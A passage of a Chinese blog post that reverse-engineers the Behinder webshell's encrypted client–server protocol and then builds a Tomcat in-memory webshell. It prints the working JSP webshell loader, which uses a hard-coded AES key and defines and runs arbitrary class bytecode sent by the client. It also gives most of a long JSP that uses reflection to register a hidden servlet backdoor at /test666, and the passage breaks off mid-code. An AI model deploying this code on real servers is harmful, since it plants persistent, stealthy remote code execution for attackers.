<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210104201133062.png" alt="image-20210104201133062"></p>
<p>​        在vip.youwe.sheller.utils.Utils#getData(java.lang.String, int, java.lang.String, java.util.Map&lt;java.lang.String,java.lang.String&gt;, java.lang.String, byte[])中首先判断type是否为jsp，设置了classname为<code>vip.youwe.sheller.payload.java.FileOperation</code>,调用了<code>Params.getParamedClass(className, params);</code></p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210104202236081.png" alt="image-20210104202236081"></p>
<p>​        vip.youwe.sheller.core.Params#getParamedClass通过ASM修改字节码的方式修改<code>vip.youwe.sheller.payload.java.FileOperation</code>字节码，对其中的mode、path、content属性进行修改，并将修改后的class字节码转换为byte[]返回。</p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210104202457148.png" alt="image-20210104202457148"></p>
<p>​        getParamedClass执行结束后，调用<code>Crypt.Encrypt(bincls, key)</code>对返回的字节码进行AES加密。</p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210104203932657.png" alt="image-20210104203932657"></p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210104204209133.png" alt="image-20210104204209133"></p>
<p>​            将AES加密的FileOperation字节码通过base64编码，再转换为byte[]返回。</p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210104204349734.png" alt="image-20210104204349734"></p>
<p>​        uploadFile中获取加密的内容后的内容后保存data中，通过<code>Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);</code>发送data。</p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210104204640350.png" alt="image-20210104204640350"></p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210104204751479.png" alt="image-20210104204751479"></p>
<p>​        vip.youwe.sheller.utils.Utils#sendPostRequestBinary设置请求的地址，header，将传入的data发送到服务端。</p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210104204945951.png" alt="image-20210104204945951"></p>
<h4 id="接收请求"><a href="#接收请求" class="headerlink" title="接收请求"></a>接收请求</h4><p>​        获取返回内容，将返回内容保存到data属性中，并设置header和status属性到result中。</p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210104205432759.png" alt="image-20210104205432759"></p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210104205501589.png" alt="image-20210104205501589"></p>
<pre><code>requestAndParse中判断是否配置了额外追加的内容，如果没有则按原来的内容写入data属性并返回。</code></pre><p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210105091901459.png" alt="image-20210105091901459"></p>
<p>​        回到uploadFile方法，将接收的内容转换为byte[],调用<code>Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType)</code>解密。</p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210105092141005.png" alt="image-20210105092141005"></p>
<p>​        vip.youwe.sheller.core.Crypt#Decrypt中调用vip.youwe.sheller.core.Crypt#DecryptForJava解密。</p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210105092342257.png" alt="image-20210105092342257"></p>
<p>​        使用AES算法解密，将解密的内容转换为字符串，最终通过base64解码获取到返回结果。</p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210105092444335.png" alt="image-20210105092444335"></p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210105092550558.png" alt="image-20210105092550558"></p>
<p>​        回到vip.youwe.sheller.ui.controller.FileManagerViewController#uploadFile中，获取status和msg的内容，根据status的内容判断是否上传成功。</p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210105092833304.png" alt="image-20210105092833304"></p>
<p>​        客户端的执行过程分析完毕，总结一下流程。</p>
<ul>
<li>获取需要上传的文件名和文件内容</li>
<li>通过ASM机制修改FileOperation字节码，修改其中的mode、path、content参数内容</li>
<li>将修改后的FileOperation字节码转换为byte[],并调用Crypt.Encrypt(bincls, key)对FileOperation字节码进行AES加密，并将加密的结果base64编码</li>
<li>将加密的内容以post的形式发送给服务端</li>
<li>接收响应内容，对响应的内容进行AES解密，再将解密后的内容进行base64解码。</li>
</ul>
<h3 id="服务端实现"><a href="#服务端实现" class="headerlink" title="服务端实现"></a>服务端实现</h3><p>​        再分析下服务端的代码实现，首先定义了一个类，类名为U这个类继承了ClassLoader，构造方法为调用父类的构造方法，方法g是调用父类的defineClass方法，defineClass方法可以将字节码转换为类。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.util.*,javax.crypto.*,javax.crypto.spec.*"</span>%&gt;</span><br><span class="line">&lt;%!<span class="class"><span class="keyword">class</span> <span class="title">U</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>&#123;</span><br><span class="line">	U(ClassLoader c)&#123;</span><br><span class="line">		<span class="keyword">super</span>(c);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> Class <span class="title">g</span><span class="params">(<span class="keyword">byte</span> []b)</span></span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">super</span>.defineClass(b,<span class="number">0</span>,b.length);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;%&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="keyword">if</span> (request.getMethod().equals(<span class="string">"POST"</span>))&#123; <span class="comment">//判断请求类型</span></span><br><span class="line">String k=<span class="string">"e45e329feb5d925b"</span>;</span><br><span class="line">session.putValue(<span class="string">"u"</span>,k); <span class="comment">//将key写入到session</span></span><br><span class="line">Cipher c=Cipher.getInstance(<span class="string">"AES"</span>);</span><br><span class="line">c.init(<span class="number">2</span>,<span class="keyword">new</span> SecretKeySpec(k.getBytes(),<span class="string">"AES"</span>)); <span class="comment">//初始化AES解码器</span></span><br><span class="line"><span class="keyword">new</span> U(<span class="keyword">this</span>.getClass().getClassLoader()).g(</span><br><span class="line">c.doFinal(<span class="keyword">new</span> sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine())) <span class="comment">//将接收的内容base64解码后进行aes解密</span></span><br><span class="line">) <span class="comment">//创建ClassLoader对象，并调用ClassLoader.defineClass方法将接收的字节码转换为class类。</span></span><br><span class="line">    .newInstance().equals(pageContext);&#125;%&gt; <span class="comment">//创建该类对象并调用该对象的equals方法</span></span><br></pre></td></tr></table></figure>

<p>​            假如我客户端传入的是FileOperation的字节码，看下FileOperation类中equals方法的内容。在vip.youwe.sheller.payload.java.FileOperation#equals中，首先从传入的pageContext对象中获取到了session、request、response对象。因为我们之前传入的mode参数是create，所以会调用create(page)方法。</p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210105100906831.png" alt="image-20210105100906831"></p>
<p>​        vip.youwe.sheller.payload.java.FileOperation#create中，通过path参数判断需要上传的文件路径，将content的内容base64解码后写入。并将返回的内容写入到msg参数中，</p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210105101052540.png" alt="image-20210105101052540"></p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210105101213611.png" alt="image-20210105101213611"></p>
<p>​        从response对象中获取输出流，将result的内容加密后返回。</p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210105101308183.png" alt="image-20210105101308183"></p>
<p>​        vip.youwe.sheller.payload.java.FileOperation#Encrypt方法，从session中获取key，利用key将内容进行aes加密。</p>
<p><img src="/2021/01/04/%E6%B3%A8%E5%85%A5%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/image-20210105101413988.png" alt="image-20210105101413988"></p>
<h2 id="冰蝎内存马实践"><a href="#冰蝎内存马实践" class="headerlink" title="冰蝎内存马实践"></a>冰蝎内存马实践</h2><p>​        通过上面的分析，只要在注入的内存马中实现服务端的功能即可，服务端功能如下：</p>
<ul>
<li>获取defineClass对象并调用defineClass将接收的内容转换为class类。</li>
<li>将key写入到session</li>
<li>将接收的内容进行base64解码后进行AES解密</li>
<li>创建传入的class类的对象，并调用对象的equals方法，在调用的同时传入pageContext对象。</li>
</ul>
<p>代码和原服务端的代码改动不大</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"javax.management.MBeanServer"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.tomcat.util.modeler.Registry"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.lang.reflect.Field"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"com.sun.jmx.mbeanserver.NamedObject"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.Map"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.HashMap"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.StandardContext"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.lang.reflect.Method"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.IOException"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.ApplicationContext"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.lang.reflect.InvocationTargetException"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.StandardService"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.mapper.Mapper"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.concurrent.ConcurrentHashMap"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.Wrapper"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.StandardWrapper"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.ContainerBase"</span> %&gt;</span><br><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.util.*,javax.crypto.*,javax.crypto.spec.*"</span>%&gt;</span><br><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.security.GeneralSecurityException"</span>%&gt;</span><br><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.security.NoSuchAlgorithmException"</span>%&gt;</span><br><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"javax.crypto.Cipher"</span>%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.security.InvalidKeyException"</span>%&gt;</span><br><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.security.NoSuchAlgorithmException"</span>%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;servletContext&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%!<span class="class"><span class="keyword">class</span> <span class="title">U</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>&#123;</span><br><span class="line">    U(ClassLoader c)&#123;</span><br><span class="line">        <span class="keyword">super</span>(c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Class <span class="title">g</span><span class="params">(<span class="keyword">byte</span> []b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.defineClass(b,<span class="number">0</span>,b.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">TomcatServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">            String value=req.getParameter(<span class="string">"sectest666"</span>);</span><br><span class="line">        <span class="keyword">if</span>(value!=<span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (value.equals(<span class="string">"unload"</span>)) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">//获取servletContext</span></span><br><span class="line">                    ServletContext servletContext = req.getServletContext();</span><br><span class="line">                    <span class="comment">//获取applicationContext</span></span><br><span class="line">                    Field contextField = servletContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">                    contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    ApplicationContext applicationContext = (ApplicationContext) contextField.get(servletContext);</span><br><span class="line">                    <span class="comment">//获取standardContext</span></span><br><span class="line">                    contextField = applicationContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">                    contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    StandardContext standardContext = (StandardContext) contextField.get(applicationContext);</span><br><span class="line">                    Field serviceF = <span class="keyword">null</span>;</span><br><span class="line">                    serviceF = applicationContext.getClass().getDeclaredField(<span class="string">"service"</span>);</span><br><span class="line">                    serviceF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    StandardService service = (StandardService) serviceF.get(applicationContext);</span><br><span class="line">                    Mapper mapper = service.getMapper();</span><br><span class="line">                    Field contextObjectToContextVersionMapF = <span class="keyword">null</span>;</span><br><span class="line">                    contextObjectToContextVersionMapF = mapper.getClass().getDeclaredField(<span class="string">"contextObjectToContextVersionMap"</span>);</span><br><span class="line">                    contextObjectToContextVersionMapF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    ConcurrentHashMap contextObjectToContextVersionMap = (ConcurrentHashMap) contextObjectToContextVersionMapF.get(mapper);</span><br><span class="line">                    Object contextVersion = contextObjectToContextVersionMap.get(standardContext);</span><br><span class="line">                    Class[] classes = mapper.getClass().getDeclaredClasses();</span><br><span class="line">                    Class contextversionClass = classes[<span class="number">1</span>];</span><br><span class="line">                    Method removeWrapper = <span class="keyword">null</span>;</span><br><span class="line">                    removeWrapper = mapper.getClass().getDeclaredMethod(<span class="string">"removeWrapper"</span>, contextversionClass, String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">                    removeWrapper.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    removeWrapper.invoke(mapper, contextVersion, <span class="string">"/test666"</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        String k = <span class="string">"e45e329feb5d925b"</span>;</span><br><span class="line">        HttpSession session = req.getSession();</span><br><span class="line">        session.setAttribute(<span class="string">"u"</span>, k);</span><br><span class="line">        Cipher c = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            c = Cipher.getInstance(<span class="string">"AES"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchPaddingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            c.init(<span class="number">2</span>, <span class="keyword">new</span> SecretKeySpec(k.getBytes(), <span class="string">"AES"</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvalidKeyException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        javax.servlet.jsp.PageContext pageContext = javax.servlet.jsp.JspFactory.getDefaultFactory().getPageContext(<span class="keyword">this</span>, req, resp, <span class="keyword">null</span>, <span class="keyword">true</span>, <span class="number">8192</span>, <span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">new</span> U(<span class="keyword">this</span>.getClass().getClassLoader()).g(</span><br><span class="line">                    c.doFinal(<span class="keyword">new</span> sun.misc.BASE64Decoder().decodeBuffer(req.getReader().readLine()))).newInstance().equals(pageContext);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalBlockSizeException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (BadPaddingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">//获取servletContext</span></span><br><span class="line">                    javax.servlet.ServletContext servletContext=request.getServletContext();</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//获取applicationContext</span></span><br><span class="line">                    java.lang.reflect.Field contextField=servletContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">                    contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext);</span><br><span class="line">                    <span class="comment">//获取standardContext</span></span><br><span class="line">                    contextField=applicationContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">                    contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    org.apache.catalina.core.StandardContext standardContext= (org.apache.catalina.core.StandardContext) contextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">                    Field serviceF = applicationContext.getClass().getDeclaredField(<span class="string">"service"</span>);</span><br><span class="line">                    serviceF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    StandardService service = (StandardService) serviceF.get(applicationContext);</span><br><span class="line">                    Mapper mapper = service.getMapper();</span><br><span class="line">                    Field contextObjectToContextVersionMapF = mapper.getClass().getDeclaredField(<span class="string">"contextObjectToContextVersionMap"</span>);</span><br><span class="line">                    contextObjectToContextVersionMapF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    ConcurrentHashMap contextObjectToContextVersionMap = (ConcurrentHashMap ) contextObjectToContextVersionMapF.get(mapper);</span><br><span class="line">                    Object contextVersion = contextObjectToContextVersionMap.get(standardContext);</span><br><span class="line">                    java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase.class.getDeclaredField("state");</span><br><span class="line">                    stateField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    Wrapper wrapper = (Wrapper) standardContext.findChild(<span class="string">"test"</span>);</span><br><span class="line">                    <span class="keyword">if</span>(wrapper ==<span class="keyword">null</span>) &#123;</span><br><span class="line">                        TomcatServlet tomcatServlet=<span class="keyword">new</span> TomcatServlet(); </span><br><span class="line">                        StandardWrapper wrappershell = (StandardWrapper) standardContext.createWrapper();</span><br><span class="line">                        Field instanceF = wrappershell.getClass().getDeclaredField(<span class="string">"instance"</span>);</span><br><span class="line">                        instanceF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        instanceF.set(wrappershell,tomcatServlet);</span><br><span class="line">                        wrappershell.setServletClass(<span class="string">"TomcatServlet"</span>);</span><br><span class="line">                        Field parent = ContainerBase.class.getDeclaredField("parent");</span><br><span class="line">                        parent.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        parent.set(wrappershell, standardContext);</span><br><span class="line">                        wrappershell.addMapping(<span class="string">"/test666"</span>);</span><br><span class="line">                        Class[] classes = mapper.getClass().getDeclaredClasses();</span><br><span class="line">                        Class contextversionClass = classes[<span class="number">1</span>];</span><br><span class="line">                        Method addWrapper = mapper.getClass().getDeclaredMethod(<span class="string">"addWrapper"</span>, contextversionClass, String<span class="class">.<span class="keyword">class</span>, <span class="title">Wrapper</span>.<span class="title">class</span>, <span class="title">boolean</span>.<span class="title">class</span>, <span class="title">boolean</span>.<span class="title">class</span>)</span>;</span><br><span class="line">                        addWrapper.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        addWrapper.invoke(mapper, contextVersion, <span class="string">"/test666"</span>, wrappershell, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">                        